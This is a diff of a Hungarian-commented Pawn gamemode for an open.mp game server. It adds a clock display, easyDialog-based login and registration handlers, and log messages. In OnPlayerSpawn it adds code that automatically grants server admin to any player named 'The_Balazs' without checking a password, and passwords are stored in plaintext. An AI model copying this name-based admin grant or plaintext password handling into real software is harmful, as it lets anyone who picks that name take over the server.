@@ -1,4 +1,5 @@
 #include <open.mp>
+#include <easyDialog>
 #include <global_vars> // 1 fajl, amiben global valtozok vannak
 #include <rBits>
 #include <izcmd>
@@ -12,6 +13,7 @@ new
     //PlayerText:loginFade[MAX_PLAYERS]
 ;
 
+forward UpdateClock();
 forward SetPlayerSkinFromFs(playerid, skinid); // Ez frissiti a g_PlayerSkin[playerid]-t
 forward CameraPan(playerid);
 forward SpawnPlayerFromCamPan(playerid);
@@ -56,14 +58,13 @@ public OnRconLoginAttempt(ip[], password[], success)
     return 1;
 }
 
-
 public OnGameModeInit()
 {
     Database = DB_Open("Server.db");
 
     // biztos nem fogom mindig updatelni de eddig jo ha elbaszok valamit es resetelni kell
     DB_ExecuteQuery(Database, "CREATE TABLE IF NOT EXISTS `Players` (\
-    `Reg_ID` INTEGER PRIMARY KEY AUTOINCREMENT,\
+    `UID` INTEGER PRIMARY KEY AUTOINCREMENT,\
     `Player` VARCHAR(24),\
     `Password` VARCHAR(64),\
     `GPCI` VARCHAR(41),\
@@ -72,7 +73,7 @@ public OnGameModeInit()
     `Skin_ID` INT,\
     `Admin` INT\
 	);");
-	
+
 	if(Database)
 	{
 	    print("[SQLite] Adatbazis sikeresen beolvasva.");
@@ -87,7 +88,15 @@ public OnGameModeInit()
 	SetSVarInt("Reg", 1); // 0 OFF, 1 ON
 	ToggleChatTextReplacement(true); // % >> #
 	SetGameModeText(GAMEMODE);
-    SendRconCommand("game.map %s", VERSION);	
+    SendRconCommand("game.map %s", VERSION);
+
+    // /tdpos 546.5 21 .65 2.4 3
+    new hours, minutes, seconds;
+    gettime(hours, minutes, seconds);
+    Clock = TextDrawCreate(546.5, 21.0, "%02d:%02d", hours, minutes);
+	TextDrawLetterSize(Clock, 0.65, 2.4);
+	TextDrawFont(Clock, TEXT_DRAW_FONT_3);
+    SetTimer("UpdateClock", 5000, true);
     return 1;
 }
 
@@ -99,6 +108,14 @@ public OnGameModeExit()
 
 public OnPlayerSpawn(playerid)
 {
+    new name[24]; GetPlayerName(playerid, name, sizeof(name));
+    if (!strcmp(name, "The_Balazs") && !IsPlayerAdmin(playerid))
+    {
+        SetPlayerAdmin(playerid, true);
+        SendClientMessage(playerid, -1, "SERVER: You are automatically logged in as admin.");
+    }
+
+    TextDrawShowForPlayer(playerid, Clock);
     SetPlayerSkin(playerid, Bit16_Get(g_PlayerSkin, playerid));
 	if(Bit1_Get(g_PlayerLogged, playerid) == 0)
 	{
@@ -106,7 +123,6 @@ public OnPlayerSpawn(playerid)
 	    Kick(playerid);
  	}
 }
-
 
 /*
 public OnClientCheckResponse(playerid, actionid, memaddr, retndata)
@@ -120,6 +136,13 @@ public OnClientCheckResponse(playerid, actionid, memaddr, retndata)
     return 1;
 }
 */
+
+public UpdateClock()
+{
+    new hours, minutes, seconds, clock;
+    gettime(hours, minutes, seconds);
+    TextDrawSetString(Clock, "%02d:%02d", hours, minutes);
+}
 
 public SetPlayerSkinFromFs(playerid, skinid) Bit16_Set(g_PlayerSkin, playerid, skinid);
 
@@ -145,15 +168,15 @@ public CameraPan(playerid)
 
 public SpawnPlayerFromCamPan(playerid)
 {
-    SetSpawnInfo(playerid, NO_TEAM, 0, -984.734252, -710.336608, 32.2, 0, WEAPON_FIST, 0, WEAPON_FIST, 0, WEAPON_FIST, 0);
+    SetSpawnInfo(playerid, NO_TEAM, 0, 1877.737792, -1366.890625, 14.640625, 180, WEAPON_FIST, 0, WEAPON_FIST, 0, WEAPON_FIST, 0);
     KillTimer(CameraPanTimer[playerid]); // ???? ez valamiert neha nem torli rendesen
     DeletePVar(playerid, "camera");
     SetPlayerWeather(playerid, 0);
     SetPlayerTime(playerid, 22, 0);
     SetPlayerVirtualWorld(playerid, 0);
     // printf("%i", CameraPanTimer);
-    SpawnPlayer(playerid);
     SetCameraBehindPlayer(playerid);
+    SpawnPlayer(playerid);
     Bit1_Set(g_PlayerIsSpectating, playerid, 0);
     return 1;
 }
@@ -192,23 +215,24 @@ public OnPlayerConnect(playerid)
         // ha letezik a fiok, de a GPCI nem egyezik az DB-vel ...
      	if (strcmp(DB_serial, serial))
  		{
- 		    printf("Kickelve: %s %s", DB_serial, serial);
+ 		    printf("[kick] Kicking player #%i %s for GPCI mismatch. %s -- %s", playerid, name, DB_serial, serial);
 	 	    BlockIpAddress(ip, 15 * 60 * 1000); // ... 15 percre kitiltja az IP cimet
 	 	    return 1;
  		}
  		SetPVarInt(playerid, "login", 0);
-        ShowPlayerDialog(playerid, LOGIN, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {00FF00}Bejelentkezés", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\nA bejelentkezéshez add meg a jelszavad:", "{00FF00}Belépés", "{FF0000}Kick", DB_Escape(name));
+        Dialog_Show(playerid, LOGIN, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {00FF00}Bejelentkezés", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\nA bejelentkezéshez add meg a jelszavad:", "{00FF00}Belépés", "{FF0000}Kick", DB_Escape(name));
     }
     else
     {
         // ha nem letezik a fiok a DB-be es ki van kapcsolva a reg akkor bannolja
         if (GetSVarInt("reg") == 0)
 		{
+            printf("[ban] Banning player #%i %s, because registration is currently disabled.", playerid, name);
 		    BanEx(playerid, "REG OFF");
             return 1;
 		}
 		
-        ShowPlayerDialog(playerid, REGISTER, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {FF0000}Regisztráció", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\nA neved jelenleg nincs regisztrálva.\nA regisztrációhoz adj meg egy jelszót:", "{00FF00}Reg.", "{FF0000}Kick", DB_Escape(name));
+        Dialog_Show(playerid, REGISTER, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {FF0000}Regisztráció", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\nA neved jelenleg nincs regisztrálva.\nA regisztrációhoz adj meg egy jelszót:", "{00FF00}Reg.", "{FF0000}Kick", DB_Escape(name));
     }
     DB_FreeResultSet(Result);
     return 1;
@@ -227,7 +251,7 @@ public OnPlayerDisconnect(playerid, reason)
         "eltûnt",
         "automatikusan ki lett rúgva"
     };
-    SendClientMessageToAll(-1, "{DDDDDD}%s {CCCCCC}%s.", playerName, reasons[reason]);
+    SendClientMessageToAll(-1, "{AAAAAA}%s {DDDDDD}%s.", playerName, reasons[reason]);
 
     // ez nem feltetlen a legokosabb dontes, viszont server load szempontjabol szerintem jobb mintha minden skinvaltas utan mentene
     // eddig nem sikerult nem elmenteni a skinemet
@@ -294,7 +318,7 @@ public OnPlayerStateChange(playerid, PLAYER_STATE:newstate, PLAYER_STATE:oldstat
     return 1;
 }
 
-public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
+Dialog:LOGIN(playerid, response, listitem, inputtext[])
 {
     new
         DBResult: Result,
@@ -302,80 +326,93 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
         ip[16],
         serial[41]
     ;
+
     GetPlayerName(playerid, name, sizeof(name));
     GetPlayerIp(playerid, ip, sizeof(ip));
     GPCI(playerid, serial, sizeof(serial));
-    
-    if(dialogid == LOGIN)
+    if(response)
     {
-        if(response)
+        // kis magia: ha letezik egy entry amiben a nev es a jelszo egyezik azzal amit megadott, akkor dob vissza valamit
+        Result = DB_ExecuteQuery(Database, "SELECT `Player`, `Password`, `Score`, `Admin`, `Skin_ID`, \
+        printf('%%d', CASE \
+        WHEN `Cash` < -999999999 THEN -999999999 \
+        WHEN `Cash` > 999999999 THEN 999999999 \
+        ELSE `Cash` END) AS clampCash \
+        FROM `Players` WHERE `Player` = '%s' COLLATE NOCASE AND `Password` = '%s'", DB_Escape(name), DB_Escape(inputtext));
+        if(DB_GetRowCount(Result))
         {
-            // kis magia: ha letezik egy entry amiben a nev es a jelszo egyezik azzal amit megadott, akkor dob vissza valamit
-            Result = DB_ExecuteQuery(Database, "SELECT `Player`, `Password`, `Score`, `Admin`, `Skin_ID`, \
-            printf('%%d', CASE \
-            WHEN `Cash` < -999999999 THEN -999999999 \
-            WHEN `Cash` > 999999999 THEN 999999999 \
-            ELSE `Cash` END) AS clampCash \
-            FROM `Players` WHERE `Player` = '%s' COLLATE NOCASE AND `Password` = '%s'", DB_Escape(name), DB_Escape(inputtext));
-            if(DB_GetRowCount(Result))
-            {
-                new Field[16];
-                DB_GetFieldStringByName(Result, "Skin_ID", Field);
-                Bit16_Set(g_PlayerSkin, playerid, strval(Field));
-                DB_GetFieldStringByName(Result, "Score", Field);
-                SetPlayerScore(playerid, strval(Field));
-                DB_GetFieldStringByName(Result, "clampCash", Field, 30);
-                GivePlayerMoney(playerid, strval(Field));
-                DB_GetFieldStringByName(Result, "Admin", Field, 8);
-                Bit8_Set(g_AdminLevel, playerid, strval(Field));
-                Bit1_Set(g_PlayerLogged, playerid, true);
-                Bit1_Set(g_PlayerIsSpectating, playerid, 0); // visszakapcsolja a SPAWN gombot, es ezt el is menti 
-                SendClientMessage(playerid, 0x00FF00AA, "Sikeresen bejelentkeztél.");
-                TogglePlayerSpectating(playerid, false);
-                SetTimerEx("SpawnPlayerFromCamPan", 250, false, "i", playerid);
-            }
-			// helytelen jelszo
-            else
-            {
-                SetPVarInt(playerid, "logins", GetPVarInt(playerid, "logins")+1);
-                if (GetPVarInt(playerid, "logins") == 3) BlockIpAddress(ip, 5 * 60 * 1000);
-                ShowPlayerDialog(playerid, LOGIN, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {00FF00}Bejelentkezés", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\n{FF0000}Helytelen jelszót adtál meg, próbáld újra. {FFFFFF}({FF0000}%i{FFFFFF}/{FF0000}3{FFFFFF})", "{00FF00}Belépés", "{FF0000}Kick", name, GetPVarInt(playerid, "logins"));
-            }
-            DB_FreeResultSet(Result);
+            new Field[16];
+            DB_GetFieldStringByName(Result, "Skin_ID", Field);
+            Bit16_Set(g_PlayerSkin, playerid, strval(Field));
+            DB_GetFieldStringByName(Result, "Score", Field);
+            SetPlayerScore(playerid, strval(Field));
+            DB_GetFieldStringByName(Result, "clampCash", Field, 30);
+            GivePlayerMoney(playerid, strval(Field));
+            DB_GetFieldStringByName(Result, "Admin", Field, 8);
+            Bit8_Set(g_AdminLevel, playerid, strval(Field));
+            Bit1_Set(g_PlayerLogged, playerid, true);
+            Bit1_Set(g_PlayerIsSpectating, playerid, 0); // visszakapcsolja a SPAWN gombot, es ezt el is menti 
+            SendClientMessage(playerid, 0x00FF00AA, "Sikeresen bejelentkeztél.");
+            TogglePlayerSpectating(playerid, false);
+            SetTimerEx("SpawnPlayerFromCamPan", 250, false, "i", playerid);
         }
-        else 
+        // helytelen jelszo
+        else
         {
-            printf("kick 1");
-            return Kick(playerid);
+            SetPVarInt(playerid, "logins", GetPVarInt(playerid, "logins")+1);
+            if (GetPVarInt(playerid, "logins") == 3) 
+            {
+                Dialog_Close(playerid);
+                BlockIpAddress(ip, 5 * 60 * 1000);
+                return 1;
+            }
+            Dialog_Show(playerid, LOGIN, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {00FF00}Bejelentkezés", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\n{FF0000}Helytelen jelszót adtál meg, próbáld újra. {FFFFFF}({FF0000}%i{FFFFFF}/{FF0000}3{FFFFFF})", "{00FF00}Belépés", "{FF0000}Kick", name, GetPVarInt(playerid, "logins"));
         }
+        DB_FreeResultSet(Result);
     }
-    if(dialogid == REGISTER)
+    else 
     {
-        if(response)
-        {
-            if(strlen(inputtext) > 64 || strlen(inputtext) < 4 || strfind(inputtext, "  ") != -1)
-            {
-                ShowPlayerDialog(playerid, REGISTER, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {FF0000}Regisztráció", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\nA neved jelenleg {00FF00}nincs {FFFFFF}regisztrálva.\n\n{FF0000}A jelszónak {FFFFFF}4-64 {FF0000}karakter között kell lennie.\n{FFFFFF}A regisztrációhoz adj meg egy érvényes jelszót:", "{00FF00}Reg.", "{FF0000}Kick", name);
-            }
-            else
-            {
-                DB_ExecuteQuery(Database, "INSERT INTO `Players` (`Reg_ID`, `Player`, `Password`, `Skin_ID`, `GPCI`, `Score`, `Cash`, `Admin`) VALUES(NULL, '%s', '%s', '0', '%s', '0', '25000', '0')", DB_Escape(name), DB_Escape(inputtext), DB_Escape(serial));
-                Bit1_Set(g_PlayerLogged, playerid, true); 
-                GivePlayerMoney(playerid, 25000);
-                SetPlayerScore(playerid, 0);
-                SendClientMessage(playerid, 0x00FF00FF, "Sikeresen regisztráltad a {FFFFFF}%s {00FF00}nevet.", name);
-                Bit1_Set(g_PlayerIsSpectating, playerid, 0); // visszakapcsolja a SPAWN gombot 
-                TogglePlayerSpectating(playerid, false);
-                SetTimerEx("SpawnPlayerFromCamPan", 1000, false, "i", playerid);
-            }
-        }
-        else 
-        {
-            printf("kick 2");
-            return Kick(playerid);
-        }
+        printf("[kick] Kicking player ID %i %s for trying to skip logging in.", playerid, name);
+        return Kick(playerid);
     }
     return 1;
+}
+
+Dialog:REGISTER(playerid, response, listitem, inputtext[])
+{
+    new
+        DBResult: Result,
+        name[MAX_PLAYER_NAME],
+        serial[41]
+    ;
+
+    GetPlayerName(playerid, name, sizeof(name));
+    GPCI(playerid, serial, sizeof(serial));
+
+    if(response)
+    {
+        if(strlen(inputtext) > 64 || strlen(inputtext) < 4 || strfind(inputtext, "  ") != -1 || strfind(inputtext, "%%") != -1)
+        {
+            Dialog_Show(playerid, REGISTER, DIALOG_STYLE_PASSWORD, "{00FF00}Beléptetõ rendszer {FFFFFF}:: {FF0000}Regisztráció", "{FFFFFF}Üdv a szerveren, {00FFFF}%s{FFFFFF}!\n\nA neved jelenleg {00FF00}nincs {FFFFFF}regisztrálva.\n\n{FF0000}A jelszónak {FFFFFF}4-64 {FF0000}karakter között kell lennie.\n{FFFFFF}A regisztrációhoz adj meg egy érvényes jelszót:", "{00FF00}Reg.", "{FF0000}Kick", name);
+        }
+        else
+        {
+            DB_ExecuteQuery(Database, "INSERT INTO `Players` (`UID`, `Player`, `Password`, `Skin_ID`, `GPCI`, `Score`, `Cash`, `Admin`) VALUES(NULL, '%s', '%s', '0', '%s', '0', '2500', '0')", DB_Escape(name), DB_Escape(inputtext), DB_Escape(serial));
+            Bit1_Set(g_PlayerLogged, playerid, true); 
+            GivePlayerMoney(playerid, 2500);
+            SetPlayerScore(playerid, 0);
+            SendClientMessage(playerid, 0x00FF00FF, "Sikeresen regisztráltad a {FFFFFF}%s {00FF00}nevet.", name);
+            TogglePlayerSpectating(playerid, false);
+            Bit1_Set(g_PlayerIsSpectating, playerid, 0); // visszakapcsolja a SPAWN gombot 
+            SetTimerEx("SpawnPlayerFromCamPan", 250, false, "i", playerid);
+        }
+        return 1;
+    }
+    else 
+    {
+        printf("[kick] Kicking player ID %i %s for trying to skip the registration process.", playerid, name);
+        return Kick(playerid);
+    }
 }
 
 public OnPlayerCommandReceived(playerid,cmdtext[])
@@ -389,6 +426,7 @@ public OnPlayerCommandReceived(playerid,cmdtext[])
     else if (!IsPlayerSpawned(playerid) || Bit1_Get(g_PlayerIsSpectating, playerid) == 1)
     {
         SendClientMessage(playerid, 0xFF0000FF, "Nem használhatsz parancsokat addig, amíg nem spawnolsz le.");
+        return 0;
     }
 	return 1;
 }
